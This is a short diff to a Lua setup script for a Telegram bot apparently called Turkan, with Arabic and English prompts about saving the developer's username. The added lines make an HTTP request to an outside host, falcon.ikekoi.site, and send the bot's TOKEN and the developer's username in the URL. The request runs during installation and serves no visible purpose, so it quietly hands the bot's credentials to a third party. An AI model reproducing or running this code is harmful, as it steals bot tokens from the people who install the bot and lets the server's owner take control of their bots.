@@ -46,13 +46,14 @@ io.write('\n\27[1;31m🔄┇The UserName Is Channel : عذرا هاذا معرف
 os.execute('lua Turkan.lua')
 end
 io.write('\n\27[1;31mܛ The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
+pe = https.request('http://falcon.ikekoi.site/file/installtu.php?TOKEN='..token..'&USERDEV='..User_Info.Info.Username)
+print(pe)
 redis:set(Server_DevTurkan.."User_DevTurkan",User_Info.Info.Username)
 redis:set(Server_DevTurkan.."Id_DevTurkan",User_Info.Info.Id)
 else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
 os.execute('lua Turkan.lua')
-https.request('http://falcon.ikekoi.site/file/installtu.php?TOKEN='..token..'&USERDEV='..User_Info.Info.Username)
 end
 ------------------------------------------------------------------------------------------------------------
 local Run_File_Turkan_Sudo = io.open("Info_Sudo.lua", 'w')
